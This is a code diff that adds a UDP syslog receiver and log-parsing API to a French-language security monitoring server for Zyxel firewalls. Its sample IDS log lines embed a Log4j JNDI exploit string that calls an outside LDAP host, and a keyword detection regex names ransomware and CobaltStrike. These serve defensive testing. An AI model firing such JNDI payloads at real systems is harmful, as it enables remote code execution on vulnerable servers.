@@ -2,6 +2,7 @@ import express from 'express';
 import dotenv from 'dotenv';
 import path from 'path';
 import { fileURLToPath } from 'url';
+import dgram from 'dgram';
 import { GoogleGenAI, Type } from '@google/genai';
 import { createServer as createViteServer } from 'vite';
 import type {
@@ -9,6 +10,8 @@ import type {
   ScheduleFrequency,
   ScheduledAnalysisJob,
   ScheduledRunLog,
+  SyslogPacket,
+  SyslogServerStatus,
 } from './src/types/index';
 
 dotenv.config();
@@ -2758,8 +2761,397 @@ ${nowIso} [${gwTag}] [IP_Reputation] PRIORITY=HIGH CAT="Botnet_C2_Node" SRC=185.
   });
 });
 
+// ==============================================================================
+// 7. SERVEUR RÉCEPTEUR SYSLOG UDP (Port 514 / 5140)
+// Réception directe des flux Syslog UDP depuis Zyxel Nebula, USG FLEX, ATP,
+// rsyslog, syslog-ng, Wazuh, ELK Logstash.
+// ==============================================================================
+const DEFAULT_SYSLOG_PORT = Number(process.env.SYSLOG_UDP_PORT) || 514;
+const FALLBACK_SYSLOG_PORT = 5140;
+
+const syslogPackets: SyslogPacket[] = [];
+const MAX_SYSLOG_BUFFER = 1000;
+const syslogSenderStats = new Map<string, { count: number; lastSeen: string; deviceName: string }>();
+let totalSyslogPackets = 0;
+let totalSyslogBytes = 0;
+let lastSyslogPacketTime: string | null = null;
+let udpSocket: dgram.Socket | null = null;
+
+const syslogServerStatus: {
+  isListening: boolean;
+  port: number;
+  host: string;
+  protocol: 'UDP';
+  error: string | null;
+  boundAt: string | null;
+} = {
+  isListening: false,
+  port: DEFAULT_SYSLOG_PORT,
+  host: '0.0.0.0',
+  protocol: 'UDP',
+  error: null,
+  boundAt: null,
+};
+
+const SYSLOG_FACILITIES: Record<number, string> = {
+  0: 'kern (0)',
+  1: 'user (1)',
+  2: 'mail (2)',
+  3: 'daemon (3)',
+  4: 'auth (4)',
+  5: 'syslog (5)',
+  6: 'lpr (6)',
+  7: 'news (7)',
+  8: 'uucp (8)',
+  9: 'cron (9)',
+  10: 'authpriv (10)',
+  11: 'ftp (11)',
+  16: 'local0 (16)',
+  17: 'local1 (17)',
+  18: 'local2 (18)',
+  19: 'local3 (19)',
+  20: 'local4 (20)',
+  21: 'local5 - Zyxel Security (21)',
+  22: 'local6 (22)',
+  23: 'local7 (23)',
+};
+
+function parseRawSyslogPacket(raw: string, rinfo: { address: string; port: number }): SyslogPacket {
+  let facility = 21; // Default local5 for Zyxel
+  let facilityName = 'local5 - Zyxel Security (21)';
+  let severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO' = 'MEDIUM';
+
+  // Check RFC 3164 / RFC 5424 PRI header <PRI>
+  const priMatch = raw.match(/^<(\d{1,3})>/);
+  if (priMatch) {
+    const pri = parseInt(priMatch[1], 10);
+    facility = Math.floor(pri / 8);
+    const priSev = pri % 8;
+    facilityName = SYSLOG_FACILITIES[facility] || `facility-${facility}`;
+
+    if (priSev <= 2) severity = 'CRITICAL';
+    else if (priSev <= 4) severity = 'HIGH';
+    else if (priSev === 5) severity = 'MEDIUM';
+    else if (priSev === 6) severity = 'LOW';
+    else severity = 'INFO';
+  }
+
+  // Refine severity with log keywords
+  if (/CRITICAL|Emergency|Alert|LockBit|CobaltStrike|Log4j|Ransomware/i.test(raw)) {
+    severity = 'CRITICAL';
+  } else if (/PRIORITY=HIGH|HIGH|Exploit|Brute Force|SYN_Flood|Quarantine/i.test(raw)) {
+    severity = 'HIGH';
+  } else if (/PRIORITY=MEDIUM|MEDIUM|Suspicious|Warning/i.test(raw)) {
+    severity = 'MEDIUM';
+  } else if (/PRIORITY=LOW|LOW|Info/i.test(raw)) {
+    severity = 'LOW';
+  }
+
+  // Extract Category
+  let category = 'Traffic_Anomaly';
+  if (/IDP\/IPS|IPS|Intrusion/i.test(raw)) category = 'IDP/IPS';
+  else if (/Anti-Malware|Virus|Ransomware|Trojan/i.test(raw)) category = 'Anti-Malware';
+  else if (/IP_Reputation|Reputation|Botnet|Tor/i.test(raw)) category = 'IP_Reputation';
+  else if (/Content_Filter|Web_Filter|Phishing/i.test(raw)) category = 'Content_Filter';
+  else if (/VPN_Auth|SSL-VPN|IKEv2/i.test(raw)) category = 'VPN_Auth';
+  else if (/CDR_Quarantine|CDR/i.test(raw)) category = 'CDR_Quarantine';
+
+  // Extract IPs
+  let srcIp: string | undefined;
+  let srcPort: number | undefined;
+  const srcMatch = raw.match(/\b(?:SRC|src|client)=([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})(?::([0-9]+))?/i);
+  if (srcMatch) {
+    srcIp = srcMatch[1];
+    srcPort = srcMatch[2] ? parseInt(srcMatch[2], 10) : undefined;
+  }
+
+  let dstIp: string | undefined;
+  let dstPort: number | undefined;
+  const dstMatch = raw.match(/\b(?:DST|dst|dest|TARGET_IP)=([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})(?::([0-9]+))?/i);
+  if (dstMatch) {
+    dstIp = dstMatch[1];
+    dstPort = dstMatch[2] ? parseInt(dstMatch[2], 10) : undefined;
+  }
+
+  // Extract threat name
+  let threatName: string | undefined;
+  const nameMatch = raw.match(/(?:NAME|VIRUS|MSG|EVENT|threatName)="([^"]+)"/i);
+  if (nameMatch) {
+    threatName = nameMatch[1];
+  } else {
+    const typeMatch = raw.match(/(?:TYPE|CAT)="([^"]+)"/i);
+    if (typeMatch) threatName = typeMatch[1];
+  }
+
+  // Action
+  let action: 'Blocked' | 'Dropped' | 'Alerted' | 'Quarantined' | 'Allowed' = 'Alerted';
+  if (/ACTION=Blocked|ACTION="Blocked"|Blocked/i.test(raw)) action = 'Blocked';
+  else if (/ACTION=Dropped|ACTION="Dropped"|Dropped/i.test(raw)) action = 'Dropped';
+  else if (/ACTION=Quarantined|Quarantine/i.test(raw)) action = 'Quarantined';
+  else if (/ACTION=Allowed|Allow/i.test(raw)) action = 'Allowed';
+
+  const isBlocked = action === 'Blocked' || action === 'Dropped' || action === 'Quarantined';
+
+  // Source Device
+  let sourceDevice = `Zyxel Gateway (${rinfo.address})`;
+  const devMatch = raw.match(/\[(ATP\d+|USG[_\s]?FLEX\w*|ZyWALL\w*|VPN\w*|USG\d+)\]/i);
+  if (devMatch) {
+    sourceDevice = `Zyxel ${devMatch[1]}`;
+  } else if (raw.includes('ATP700')) {
+    sourceDevice = 'Zyxel ATP700';
+  } else if (raw.includes('USG_FLEX')) {
+    sourceDevice = 'Zyxel USG FLEX 500';
+  }
+
+  return {
+    id: `syslog-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
+    timestamp: new Date().toISOString(),
+    raw,
+    remoteAddress: rinfo.address,
+    remotePort: rinfo.port,
+    facility,
+    facilityName,
+    severity,
+    category,
+    sourceDevice,
+    srcIp,
+    srcPort,
+    dstIp,
+    dstPort,
+    threatName: threatName || 'Événement de Sécurité Réseau',
+    action,
+    isBlocked,
+  };
+}
+
+function handleIncomingSyslogPacket(buffer: Buffer, rinfo: dgram.RemoteInfo) {
+  const raw = buffer.toString('utf-8').trim();
+  if (!raw) return;
+
+  totalSyslogPackets += 1;
+  totalSyslogBytes += buffer.length;
+  const nowIso = new Date().toISOString();
+  lastSyslogPacketTime = nowIso;
+
+  const parsed = parseRawSyslogPacket(raw, rinfo);
+  syslogPackets.unshift(parsed);
+  if (syslogPackets.length > MAX_SYSLOG_BUFFER) {
+    syslogPackets.pop();
+  }
+
+  // Track sender stats
+  const currentSender = syslogSenderStats.get(rinfo.address) || {
+    count: 0,
+    lastSeen: nowIso,
+    deviceName: parsed.sourceDevice,
+  };
+  currentSender.count += 1;
+  currentSender.lastSeen = nowIso;
+  currentSender.deviceName = parsed.sourceDevice;
+  syslogSenderStats.set(rinfo.address, currentSender);
+}
+
+function startUdpSyslogServer(preferredPort = DEFAULT_SYSLOG_PORT) {
+  try {
+    if (udpSocket) {
+      try {
+        udpSocket.close();
+      } catch (_) {}
+    }
+
+    udpSocket = dgram.createSocket({ type: 'udp4', reuseAddr: true });
+
+    udpSocket.on('error', (err: any) => {
+      console.warn(`[Syslog UDP] Notice sur port ${preferredPort}:`, err.message);
+      syslogServerStatus.error = err.message;
+
+      // In Linux without sudo / root, port < 1024 triggers EACCES
+      if ((err.code === 'EACCES' || err.code === 'EADDRINUSE') && preferredPort === 514) {
+        console.log(`[Syslog UDP] Port 514 requiert des privilèges root ou est déjà occupé. Bascule automatique sur port ${FALLBACK_SYSLOG_PORT}...`);
+        startUdpSyslogServer(FALLBACK_SYSLOG_PORT);
+      }
+    });
+
+    udpSocket.on('message', (msg, rinfo) => {
+      handleIncomingSyslogPacket(msg, rinfo);
+    });
+
+    udpSocket.on('listening', () => {
+      const addr = udpSocket?.address();
+      if (addr && typeof addr === 'object') {
+        syslogServerStatus.isListening = true;
+        syslogServerStatus.port = addr.port;
+        syslogServerStatus.host = addr.address;
+        syslogServerStatus.boundAt = new Date().toISOString();
+        syslogServerStatus.error = null;
+        console.log(`[Syslog UDP] Serveur récepteur actif en écoute sur UDP ${addr.address}:${addr.port}`);
+      }
+    });
+
+    udpSocket.bind(preferredPort, '0.0.0.0');
+  } catch (err: any) {
+    console.error('[Syslog UDP] Erreur initialisation dgram:', err);
+    syslogServerStatus.error = err?.message || String(err);
+  }
+}
+
+// 7.1 Statut du récepteur Syslog UDP & Instructions Rsyslog
+app.get('/api/syslog/status', (_req, res) => {
+  const sendersList = Array.from(syslogSenderStats.entries()).map(([ip, data]) => ({
+    ip,
+    count: data.count,
+    lastSeen: data.lastSeen,
+    deviceName: data.deviceName,
+  }));
+
+  const epsRate = lastSyslogPacketTime
+    ? Math.round((totalSyslogPackets / Math.max(1, (Date.now() - new Date(syslogServerStatus.boundAt || Date.now()).getTime()) / 1000)) * 10) / 10
+    : 0;
+
+  res.json({
+    isListening: syslogServerStatus.isListening,
+    port: syslogServerStatus.port,
+    host: syslogServerStatus.host,
+    protocol: 'UDP',
+    packetsReceived: totalSyslogPackets,
+    bytesReceived: totalSyslogBytes,
+    bufferCount: syslogPackets.length,
+    lastPacketAt: lastSyslogPacketTime,
+    activeSenders: sendersList,
+    error: syslogServerStatus.error,
+    eventsPerSecond: epsRate,
+    rsyslogGuide: {
+      configPath: '/etc/rsyslog.conf',
+      imudpLines: 'module(load="imudp")\ninput(type="imudp" port="514")',
+      restartCommand: 'sudo systemctl restart rsyslog',
+      firewallCommand: 'sudo ufw allow 514/udp',
+      checkPortCommand: 'sudo ss -ulnp | grep 514',
+      syslogNgSnippet: 'source s_network_udp {\n    udp(ip(0.0.0.0) port(514));\n};',
+      zyxelCliSnippet: 'configure terminal\nsyslog-server 1 ip-address <IP_SERVEUR> port 514\nsyslog-server 1 facility local5\nsyslog-server 1 log-type traffic-log security-log alert-log\nwrite memory',
+    },
+  });
+});
+
+// 7.2 Obtenir les logs reçus via UDP
+app.get('/api/syslog/logs', (req, res) => {
+  const limit = Math.min(500, Number(req.query.limit) || 100);
+  const severityFilter = req.query.severity ? String(req.query.severity).toUpperCase() : null;
+  const searchFilter = req.query.search ? String(req.query.search).toLowerCase() : null;
+  const categoryFilter = req.query.category ? String(req.query.category) : null;
+
+  let filtered = [...syslogPackets];
+
+  if (severityFilter && severityFilter !== 'ALL') {
+    filtered = filtered.filter((p) => p.severity === severityFilter);
+  }
+  if (categoryFilter && categoryFilter !== 'ALL') {
+    filtered = filtered.filter((p) => p.category === categoryFilter);
+  }
+  if (searchFilter) {
+    filtered = filtered.filter(
+      (p) =>
+        p.raw.toLowerCase().includes(searchFilter) ||
+        (p.srcIp && p.srcIp.includes(searchFilter)) ||
+        (p.dstIp && p.dstIp.includes(searchFilter)) ||
+        (p.threatName && p.threatName.toLowerCase().includes(searchFilter)) ||
+        p.sourceDevice.toLowerCase().includes(searchFilter)
+    );
+  }
+
+  res.json({
+    logs: filtered.slice(0, limit),
+    totalInBuffer: syslogPackets.length,
+    totalReceived: totalSyslogPackets,
+    filteredCount: filtered.length,
+    activePort: syslogServerStatus.port,
+    isListening: syslogServerStatus.isListening,
+  });
+});
+
+// 7.3 Effacer le tampon de logs UDP
+app.post('/api/syslog/clear', (_req, res) => {
+  syslogPackets.length = 0;
+  res.json({ success: true, message: 'Tampon Syslog UDP réinitialisé' });
+});
+
+// 7.4 Envoyer un paquet UDP réel de test sur le serveur local
+app.post('/api/syslog/send-test', (req, res) => {
+  const customMessage = req.body?.customMessage ||
+    `<189>Oct 15 14:30:00 zyxel-atp700 2026-10-15T14:30:00Z [ATP700] [IDP/IPS] PRIORITY=CRITICAL SIG_ID=1120038 NAME="Apache Log4j Remote Code Execution (CVE-2021-44228)" PROTO=TCP SRC=45.142.122.9:43891 DST=192.168.1.80:80 ACTION=Dropped PAYLOAD="\${jndi:ldap://45.142.122.9:1389/Exploit}"`;
+
+  const targetPort = syslogServerStatus.port || DEFAULT_SYSLOG_PORT;
+
+  try {
+    const client = dgram.createSocket('udp4');
+    const messageBuffer = Buffer.from(customMessage);
+
+    client.send(messageBuffer, 0, messageBuffer.length, targetPort, '127.0.0.1', (err) => {
+      client.close();
+      if (err) {
+        return res.status(500).json({ success: false, error: err.message });
+      }
+      return res.json({
+        success: true,
+        message: `Paquet UDP envoyé avec succès vers 127.0.0.1:${targetPort}`,
+        packet: customMessage,
+      });
+    });
+  } catch (err: any) {
+    return res.status(500).json({ success: false, error: err?.message || String(err) });
+  }
+});
+
+// 7.5 Injection directe d'un lot d'échantillons réalistes Zyxel Syslog
+app.post('/api/syslog/inject-sample', (req, res) => {
+  const deviceType = req.body?.deviceType || 'ATP700';
+
+  const samples = [
+    `<134>Oct 15 14:35:10 zyxel-atp700 2026-10-15T14:35:10Z [ATP700] [Anti-Malware] PRIORITY=CRITICAL VIRUS="Win64.Ransomware.LockBit.V3" HASH="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" SRC=91.240.118.172:443 DST=192.168.1.105:49201 ACTION=Quarantined_CDR HOST="DESKTOP-FINANCE-04"`,
+    `<187>Oct 15 14:35:32 zyxel-atp700 2026-10-15T14:35:32Z [ATP700] [IDP/IPS] PRIORITY=CRITICAL SIG_ID=1120489 NAME="Trojan.Win32.CobaltStrike.Beacon" PROTO=TCP SRC=192.168.1.105:49182 DST=91.240.118.172:443 ACTION=Dropped HOST="DESKTOP-FINANCE-04" MAC="00:1A:2B:3C:4D:5E"`,
+    `<188>Oct 15 14:36:01 zyxel-atp700 2026-10-15T14:36:01Z [ATP700] [IP_Reputation] PRIORITY=HIGH CAT="Botnet_C2" SRC=192.168.1.105:49201 DST=91.240.118.172:443 ACTION=Blocked REPUTATION_SCORE=98 COUNTRY="RU"`,
+    `<189>Oct 15 14:36:25 zyxel-usg-flex 2026-10-15T14:36:25Z [USG_FLEX] [VPN_Auth] PRIORITY=HIGH MSG="SSL-VPN Authentication Failed" USER="admin" SRC=45.142.122.9:54210 DST=195.154.80.12:4433 REASON="Invalid credentials" ATTEMPTS=84`,
+    `<190>Oct 15 14:36:45 zyxel-usg-flex 2026-10-15T14:36:45Z [USG_FLEX] [IDP/IPS] PRIORITY=CRITICAL SIG_ID=1120038 NAME="Apache Log4j Remote Code Execution (CVE-2021-44228)" PROTO=TCP SRC=45.142.122.9:43891 DST=192.168.1.80:80 ACTION=Dropped PAYLOAD="\${jndi:ldap://45.142.122.9:1389/Exploit}"`,
+    `<191>Oct 15 14:37:12 zyxel-atp700 2026-10-15T14:37:12Z [ATP700] [Traffic_Anomaly] PRIORITY=CRITICAL TYPE="DNS_Tunneling" CLIENT=192.168.1.105 DEST=185.220.101.5:53 BYTES_SENT=842000 ACTION=Alerted DETAILS="Base64 encoded subdomains detected"`,
+  ];
+
+  samples.forEach((line) => {
+    handleIncomingSyslogPacket(Buffer.from(line), {
+      address: deviceType === 'ATP700' ? '192.168.1.1' : '195.154.80.12',
+      family: 'IPv4',
+      port: 514,
+      size: line.length,
+    });
+  });
+
+  res.json({
+    success: true,
+    injectedCount: samples.length,
+    totalInBuffer: syslogPackets.length,
+  });
+});
+
+// 7.6 Regrouper les logs Syslog collectés pour envoi vers l'Analyseur IA SOC
+app.post('/api/syslog/aggregate-for-analysis', (_req, res) => {
+  if (syslogPackets.length === 0) {
+    return res.status(400).json({ error: 'Aucun log Syslog collecté dans le tampon UDP' });
+  }
+
+  const rawLogsText = syslogPackets.map((p) => p.raw).join('\n');
+  const sourceHosts = Array.from(new Set(syslogPackets.map((p) => p.sourceDevice)));
+
+  res.json({
+    success: true,
+    rawLogs: rawLogsText,
+    packetCount: syslogPackets.length,
+    deviceContext: sourceHosts.join(', '),
+  });
+});
+
 // 6. Vite Dev Server / Production Serving
 async function startServer() {
+  // Start the UDP Syslog Receiver daemon
+  startUdpSyslogServer(DEFAULT_SYSLOG_PORT);
+
   const isProduction = process.env.NODE_ENV === 'production';
 
   if (!isProduction) {
